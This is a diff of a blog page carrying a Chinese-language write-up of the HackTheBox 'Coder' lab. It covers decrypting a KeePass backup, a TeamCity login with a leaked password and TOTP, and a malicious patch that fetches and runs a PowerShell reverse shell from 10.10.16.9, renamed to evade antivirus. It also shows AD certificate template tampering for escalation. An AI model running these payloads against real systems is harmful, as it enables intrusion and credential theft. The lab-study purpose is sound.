@@ -38,9 +38,9 @@
 <meta property="og:site_name" content="❀言わぬが花❀">
 <meta property="og:description" content="Nmap1234567891011121314151617181920212223242526272829303132333435└─$ sudo nmap -sS 10.10.11.207 -p- --min-rate&#x3D;3000Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-11 18:47 EDTWarning: 10.10.11.207">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg">
 <meta property="article:published_time" content="2025-07-11T02:49:03.000Z">
-<meta property="article:modified_time" content="2025-07-12T12:15:40.068Z">
+<meta property="article:modified_time" content="2025-07-12T12:27:52.028Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="AD">
@@ -54,7 +54,7 @@
 <meta property="article:tag" content="PKI ADMIN">
 <meta property="article:tag" content="CreateChild">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg">
   
     <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
   
@@ -373,7 +373,7 @@
   <div class="article-gallery-photos">
     
       <a class="article-gallery-img" rel="gallery_cmczvq8c10000awky5ge9dyqf">
-        <img src="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg" itemprop="image">
+        <img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg" itemprop="image">
       </a>
     
   </div>
@@ -453,7 +453,7 @@
 <p>exe脱下来看了下，是.net的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file Encrypter.exe       </span><br><span class="line">Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdhzs14hj31dc0r17oj.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdhzs14hj31dc0r17oj.jpg" alt="image"></p>
 <p>看起来是一个简单的时间戳seed加密，key和iv都是时间戳gen出来的</p>
 <p>这里可以通过enc文件创建的时间来推出他的时间戳</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.blade.enc                         A     3808  Fri Nov 11 17:17:08 2022</span><br></pre></td></tr></table></figure>
@@ -472,7 +472,7 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ tree -al</span><br><span class="line">.</span><br><span class="line">├── .key</span><br><span class="line">├── s.blade.enc</span><br><span class="line">└── s.blade.kdbx</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdjmfuk0j312f0kd78c.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdjmfuk0j312f0kd78c.jpg" alt="image"></p>
 <p>得到的密码库内存了仨值</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;encrypted&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;totp&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TeamCity&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s.blade&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;enc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
@@ -496,7 +496,7 @@
 <p>这里 <code>BuildAgents</code> ou没有bind gpo，所以暂时不知道这个组是做啥用的。</p>
 <p>跑spn和npu没有收获，转而去看web部分</p>
 <p>使用 <code>s.blade \ veh5nUSZFFoqz9CrrhSeuwhA</code> 账户登录web</p>
-<p><img src="http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdk0nxh0j31ax0q6wik.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdk0nxh0j31ax0q6wik.jpg" alt="image"></p>
 <p>提示开了2FA 需要输入totp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Two-Factor Authentication</span><br><span class="line">Enter six-digit password from your authenticator app or one of the savedrecovery codes.</span><br></pre></td></tr></table></figure>
 
@@ -506,11 +506,11 @@
 <p><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/auth-helper/">https://addons.mozilla.org/en-US/firefox/addon/auth-helper/</a></p>
 </blockquote>
 <p>但是研究不出来他给的密码如何导入</p>
-<p><img src="http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdk7ewymj30c90dvjrz.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdk7ewymj30c90dvjrz.jpg" alt="image"></p>
 <p>想不通，所以去翻 <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html#identify-application">0xdf 的wp</a>看这部分怎么走</p>
 <p>从其中得知，被 <code>authenticator</code> 使用保护密码加密后的totp，在backup时便会以json的形式显示加密文件。</p>
 <p>如下</p>
-<p><img src="http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdkgx1x0j30wv0e3ti9.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdkgx1x0j30wv0e3ti9.jpg" alt="image"></p>
 <p>由此可以得知，keepass库中的那个json就是这个被加密的凭据。</p>
 <p>翻他的源码仓库中对于backup导入加密部分的处理</p>
 <blockquote>
@@ -563,11 +563,11 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -s <span class="string">&quot;<span class="subst">$(curl 10.10.11.207 -sI|awk -F &#x27;: &#x27; &#x27;NR==8 &#123;print $2&#125;&#x27;)</span>&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>这个账户没有直接创建任务的权限，只能对现有任务做操作</p>
-<p><img src="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bewxe3zpj31b70ls7fa.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bewxe3zpj31b70ls7fa.jpg" alt="image"></p>
 <p>直接run能看到输出了一个 <code>hello world</code> ，文件名有些眼熟，返回去看了下smb里的文件，有点像但不能完全确定。</p>
 <p>这里没有权限在run的过程中直接 pipeline 附加command。</p>
 <p>只有这部分的内容可以编辑，或者说自定义。</p>
-<p><img src="http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bezuh9v5j30ui0c741q.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bezuh9v5j30ui0c741q.jpg" alt="image"></p>
 <p>这里说让上传一个patch或者diff格式的文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Click to upload or drag &amp; drop a patch in unified diff format</span><br></pre></td></tr></table></figure>
 
@@ -581,11 +581,11 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim hello_world.ps1</span><br><span class="line"></span><br><span class="line">git init </span><br><span class="line"></span><br><span class="line">git commit -m <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ git <span class="built_in">log</span>           </span><br><span class="line">commit 8522a4ca5c91eb8c387a35c7c2839448fee712b1 (HEAD -&gt; master)</span><br><span class="line">Author: <span class="built_in">test</span> &lt;<span class="built_in">test</span>@flower&gt;</span><br><span class="line">Date:   Tue Jul 8 13:41:21 2025 -0400</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 
 <p>简单改了下，diff之后丢上去 run 了下，就报错了</p>
-<p><img src="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bfbhtle0j30bs02rgm7.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bfbhtle0j30bs02rgm7.jpg" alt="image"></p>
 <p>翻看了下执行时候的报错</p>
-<p><img src="http://tvax1.sinaimg.cn/mw690/0065CzJOly1i3bfcafuqbj31c10jl46t.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax1.sinaimg.cn/mw690/0065CzJOly1i3bfcafuqbj31c10jl46t.jpg" alt="image"></p>
 <p>看右侧报错能确定是diff文件没有成功被应用，因为我diff的 <code>ps1</code> 内容是乱写的，所以第一版的diff无法被应用，不过现在左侧能看到具体的文件内容，和smb里的一样。</p>
-<p><img src="http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bfcrb7dhj31rs0ddjyf.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bfcrb7dhj31rs0ddjyf.jpg" alt="image"></p>
 <p>得知具体文件内容，就可以正常进行diff了</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> hello_world.ps1 </span><br><span class="line"><span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line">write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line">git init             </span><br><span class="line"></span><br><span class="line">git add hello_world.ps1</span><br><span class="line"></span><br><span class="line">git commit -m <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 
@@ -593,7 +593,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff hello_world.ps1</span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..c8975e2 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> <span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line"> write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">+</span><br><span class="line">+curl 10.10.16.9</span><br><span class="line"></span><br><span class="line">git diff hello_world.ps1 &gt; test.diff</span><br></pre></td></tr></table></figure>
 
 <p>此时再次上传diff ，然后 run </p>
-<p><img src="http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bffwn21hj31340m7djh.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bffwn21hj31340m7djh.jpg" alt="image"></p>
 <p>这次没有报错并且成功收到了请求</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.207 - - [08/Jul/2025 13:59:25] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
 
@@ -601,11 +601,11 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff                            </span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..bb73e8f 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> <span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line"> write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">+</span><br><span class="line">+IEX(iwr http://10.10.16.9/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 10086</span><br></pre></td></tr></table></figure>
 
 <p>上传之后 run，被淦了，看报错是有df</p>
-<p><img src="http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfi5ab85j312l0eynad.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfi5ab85j312l0eynad.jpg" alt="image"></p>
 <p>简单改下脚本再次上传。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff            </span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..16f77a7 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> #Simple repo test for Teamcity pipeline</span><br><span class="line"> write-host &quot;Hello, World!&quot;</span><br><span class="line">+</span><br><span class="line">+IEX(iwr http://10.10.16.9/Invoke-aa.ps1 -UseBasicParsing);Invoke-aa -Rv -IA 10.10.16.9 -PP 10086</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfkgvj66j30yr0e7gp6.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfkgvj66j30yr0e7gp6.jpg" alt="image"></p>
 <p>拿到 svc_teamcity shell </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Photoshop C:\TeamCity\buildAgent\conf*<span class="built_in">cat</span> buildAgent.properties</span><br><span class="line">serverUrl=http\://localhost\:8111</span><br><span class="line"></span><br><span class="line">systemDir=C\:\\TeamCity\\buildAgent\\system</span><br><span class="line">env.TEAMCITY_JRE=C\:\\TeamCity\\jre</span><br><span class="line">name=dc01</span><br><span class="line">tempDir=C\:\\TeamCity\\buildAgent\\temp</span><br><span class="line">workDir=C\:\\TeamCity\\buildAgent\\work</span><br><span class="line">ownPort=9090</span><br><span class="line"></span><br><span class="line">authorizationToken=63a48d52c4fac2ab6a14a633d4f17a46</span><br></pre></td></tr></table></figure>
 
@@ -658,7 +658,7 @@
 <p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/kerberos-error-kdc-err-s-principal-unknown-or-not-unique">https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/kerberos-error-kdc-err-s-principal-unknown-or-not-unique</a></p>
 </blockquote>
 <p>为了规避，由修改dnshostname导致spn与目标spn撞了从而导致的dnshostname修改失败， 作者 <a target="_blank" rel="noopener" href="https://twitter.com/ly4k_"><code>Oliver Lyak</code></a>  采取的方式是，把把spn里会伴随着dnshostname的spn先扬了，再进行dnshostname的修改 <del>是个人物XD</del> .</p>
-<p><img src="http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bh38qi42j30vs0pmwto.jpg" alt="image"></p>
+<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bh38qi42j30vs0pmwto.jpg" alt="image"></p>
 <p>既然知道了原理，就先创建这个证书，这里我用的和在esc1部分一样，用的machine的模板。</p>
 <p>修改证书</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import-module ./ADCSTemplate.psm1</span><br><span class="line"></span><br><span class="line">Export-ADCSTemplate -DisplayName computer &gt; com.json</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="built_in">cat</span> com.json -raw | ConvertFrom-Json</span><br><span class="line"></span><br><span class="line"><span class="comment">## 附加 NoSecurityExtension</span></span><br><span class="line"><span class="variable">$tmp</span>.<span class="string">&quot;msPKI-Enrollment-Flag&quot;</span> = 524288</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span>|Convertto-json &gt; computer.json</span><br><span class="line"></span><br><span class="line">New-ADCSTemplate -DisplayName <span class="built_in">test</span> -JSON (<span class="built_in">cat</span> ./computer.json -raw) -Publish</span><br></pre></td></tr></table></figure>
